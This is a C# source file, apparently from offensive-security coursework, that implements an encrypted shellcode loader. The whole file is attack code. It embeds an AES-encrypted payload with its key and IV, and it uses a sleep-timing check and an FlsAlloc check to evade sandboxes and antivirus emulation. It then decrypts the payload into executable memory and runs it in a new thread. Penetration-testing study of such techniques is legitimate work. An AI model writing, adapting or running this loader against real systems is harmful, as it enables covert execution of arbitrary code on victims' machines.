﻿using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Pen300.CS
{
    public class EncryptedShellcodeExecution
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] decrypted;

                using (MemoryStream msDecrypt = new MemoryStream(encrypted))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            decrypted = msPlain.ToArray();
                        }
                    }
                }

                return decrypted;
            }
        }

        public static void Main()
        {
            byte[] encrypted = new byte[] {
0x53,0x46,0xa5,0xa7,0x81,0x13,0x83,0xf7,0x83,0x28,0x35,0x35,
0xce,0x84,0xf6,0x3e,0x8b,0xea,0x20,0xe1,0x62,0x7c,0x66,0x96,
0xcb,0x2e,0xda,0x15,0xe0,0x1b,0x9f,0x6c,0x1d,0x73,0xb9,0xfa,
0xad,0x2a,0x52,0xc5,0x51,0x1e,0x05,0x1c,0x7b,0xc4,0xab,0xc1,
0x8b,0xfa,0xa7,0x44,0x4f,0xbf,0xe5,0xf3,0xdc,0x8e,0x80,0x38,
0xec,0x9a,0xde,0x07,0xa1,0xc0,0x37,0xe3,0xab,0xc6,0x65,0x2c,
0xb2,0x67,0x60,0xa7,0x4b,0xf4,0x18,0xa5,0x26,0x00,0x22,0x7a,
0xbc,0x5d,0x58,0x6e,0x12,0x17,0x43,0xc3,0xb7,0xda,0xd1,0x79,
0xbb,0x21,0x02,0x83,0x94,0xc1,0x73,0x9c,0x52,0x08,0x17,0x8d,
0xa2,0x26,0x1e,0xb0,0x4c,0xba,0x47,0xfa,0xb2,0x52,0x4a,0xa1,
0xae,0x3a,0x9a,0xea,0xab,0xe5,0x6d,0xf0,0xd6,0x20,0xb4,0xec,
0xc9,0x1a,0xa6,0x6a,0xd6,0x59,0x71,0xb1,0x9e,0x86,0x67,0xfa,
0xa2,0x02,0x31,0x9b,0xa8,0x1e,0x57,0xa9,0x48,0x9c,0x92,0xbc,
0x63,0x16,0x17,0x40,0xcb,0xe4,0xf9,0x29,0x99,0x0b,0xb3,0x2f,
0x0e,0xfa,0xb9,0xb4,0x56,0x81,0xb9,0xf0,0x41,0x97,0x34,0xaa,
0x80,0xfb,0x49,0xb7,0x74,0xba,0x9a,0xcc,0x21,0xc8,0xa3,0xa8,
0xc4,0x98,0x97,0x07,0x33,0x42,0xdc,0x8b,0x14,0x84,0xf6,0xaf,
0x8d,0x15,0x64,0x2e,0x9e,0x50,0x42,0x76,0x41,0x14,0x44,0x44,
0xcf,0xb6,0x2f,0x44,0x70,0x41,0xb5,0x57,0xce,0xd2,0xd0,0x90,
0x93,0x68,0x79,0x69,0xf0,0xc0,0x8d,0xa4,0x93,0x4d,0x33,0xb9,
0xa0,0x24,0x6c,0x78,0x49,0x0c,0x13,0x1f,0xd0,0x37,0x25,0x63,
0x1a,0x91,0x1d,0x2a,0x4b,0x29,0x2d,0xdb,0x13,0xf6,0x78,0x12,
0xcc,0x13,0x25,0x4a,0x40,0x37,0x36,0xf7,0xfe,0x30,0xc6,0x03,
0x4a,0x1f,0x70,0x9d,0x64,0xcc,0xea,0x0b,0xc5,0x04,0x6c,0x11,
0xb0,0x52,0xb7,0x7c,0xaf,0x86,0xa9,0xf7,0xfb,0x59,0xb9,0x6a,
0x61,0x9f,0x43,0xdb,0xa7,0x9c,0xeb,0xb5,0x07,0xea,0x57,0xf0,
0x10,0xb5,0x69,0xfa,0x6f,0x37,0x54,0x45,0x25,0xd3,0x4a,0x1d,
0x01,0x79,0xc2,0xe2,0x06,0x5e,0xf4,0xf3,0x56,0xcc,0xab,0xba,
0x34,0xb5,0x62,0xf8,0x32,0x3d,0xa5,0xc2,0xf2,0x9b,0xc8,0x3d,
0xea,0x08,0x09,0xb8,0x34,0x34,0xc3,0x3d,0x73,0xdf,0xa9,0x18,
0x05,0x22,0x77,0xbb,0x00,0xfc,0x32,0x25,0x0c,0xf4,0x75,0x7d,
0xf2,0x16,0x06,0x07,0x46,0x26,0x79,0xfd,0xdc,0x0f,0xfa,0xaf,
0x97,0xc1,0x62,0x75,0xd4,0xc1,0x7c,0x02,0xe3,0xc3,0x1c,0x27,
0x69,0x3d,0x94,0xdf,0xc9,0xa2,0xac,0x34,0x52,0x44,0xbc,0x07,
0xf1,0x67,0x0a,0xc4,0x4f,0x43,0x9a,0x98,0x07,0xaf,0x6f,0xfe,
0x0e,0x5d,0x38,0x4c,0xd9,0x29,0x94,0x61,0x80,0xc2,0x95,0xef,
0xec,0x73,0x66,0x0b,0x78,0xe2,0x48,0xe1,0x73,0x95,0x5d,0x14,
0x2c,0xfe,0x30,0x0f,0x32,0x6a,0x1a,0x0d,0x05,0x31,0xb3,0x43,
0xe0,0xd9,0x72,0x2c,0x7b,0xb0,0xff,0xa5,0x28,0xe9,0xb0,0xb4,
0x22,0x86,0xa6,0x58,0xdf,0xbd,0x53,0xb4,0x01,0x7e,0xe4,0xf1,
0x09,0x19,0xbf,0x6d,0x46,0x72,0x1f,0x6c,0x7f,0xa7,0x0b,0x35,
0x67,0x14,0xcb,0xdd,0xcf,0x26,0xda,0x41,0xb7,0xc2,0x54,0xd5,
0x67,0x2e,0x4f,0x04,0x91,0x0c,0xe6,0x19,0x79,0x10,0x01,0x79,
0x10,0x26,0x33,0x95,0xdf,0x7b,0xe7,0x10,0x88,0x58,0xe7,0x86,
0x5a,0xd6,0x9d,0xde,0x43,0x6c,0xf1,0x6b,0x03,0x31,0xcb,0x9b,
0xd5,0x92,0x1e,0x5e,0xdf,0x4c,0x84,0x29,0x7e,0x03,0x56,0xe3,
0x87,0x98,0x68,0x42,0x13,0xfb,0xd8,0xc0,0xdf,0xa6,0x84,0x56,
0xfa,0x00,0x25,0xdb,0xb3,0xe0,0x99,0x02,0xfc,0xe3,0xec,0x8c,
0x77,0x24,0x5d,0x5d,0x2e,0x2c,0xf6,0x16,0xb2,0xd8,0xfa,0x1d,
0x1e,0x22,0x58,0x8f,0xfb,0x7f,0x02,0x07,0xd2,0x91,0x18,0x7e,
0x5d,0xa4,0x01,0xf1,0xd5,0xf7,0xd0,0x2c,0x4f,0x67,0xcb,0xf5,
0x38,0x2c,0xba,0xfd,0x16,0x81,0x70,0xe0,0xfd,0x9f,0x02,0x1d };
            byte[] key = new byte[] {
0x76,0x27,0xc4,0xeb,0x3c,0x4b,0x0c,0x97,0x1f,0x39,0x8a,0xfe,
0x0f,0x24,0x63,0x80,0x42,0x9f,0x7f,0x4e,0xf1,0x60,0xc4,0x9d,
0x54,0xac,0xf3,0xd6,0x80,0x30,0xfc,0xbf };
            byte[] iv = new byte[] {
0xf3,0x25,0x41,0xb9,0x54,0xd4,0xb9,0xec,0xf7,0x35,0x6a,0x62,
0xe6,0x31,0xee,0xb4 };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            

            byte[] decrypted = Decrypt(encrypted, key, iv);

            int size = decrypted.Length;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
            Marshal.Copy(decrypted, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}